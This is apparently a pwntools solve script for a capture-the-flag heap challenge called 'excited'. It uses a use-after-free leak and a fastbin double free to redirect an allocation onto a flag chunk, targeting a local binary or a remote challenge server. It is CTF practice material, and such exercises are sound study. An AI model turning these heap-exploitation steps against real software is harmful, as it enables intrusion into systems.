#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./excited')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('123.56.85.29', 6484)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./excited', checksec=False)


def add(add_ba_length, add_ba_content, add_na_length, add_na_content):
    p.sendlineafter('> Now please tell me what you want to do :', '1')
    p.sendlineafter("> ba's length : ", str(add_ba_length))
    p.sendafter('> ba : ', add_ba_content)
    p.sendlineafter("> na's length : ", str(add_na_length))
    p.sendafter('> na : ', add_na_content)


def delete(delete_idx):
    p.sendlineafter('> Now please tell me what you want to do :', '3')
    p.sendlineafter('> Banana ID : ', str(delete_idx))


def show(show_idx):
    p.sendlineafter('> Now please tell me what you want to do :', '4')
    p.sendlineafter('> Banana ID : > SCP project ID : ', str(show_idx))
    p.recvuntil("# Banana's na is ")


addr_flag_chunk = 0x602098
add(0x10, '\x01', 0x10, '\x01')  # 0
delete(0)
show(0)

addr_heap = u32(p.recvuntil('\x0a')[: -1].ljust(4, '\x00')) - 0x1260
add(0x10, '\x01', 0x10, '\x01')  # 1->0
add(0x20, '\x01', 0x50, '\x01')  # 2
add(0x20, '\x01', 0x50, '\x01')  # 3
add(0x20, '\x01', 0x30, '\x01')  # 4
delete(2)
delete(3)
delete(4)
delete(2)
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 5
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 6
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 7
add(0x20, '\x01', 0x50, '\x01')  # 8
show(8)
success('addr_heap = ' + hex(addr_heap))
# gdb.attach(p)
p.interactive()
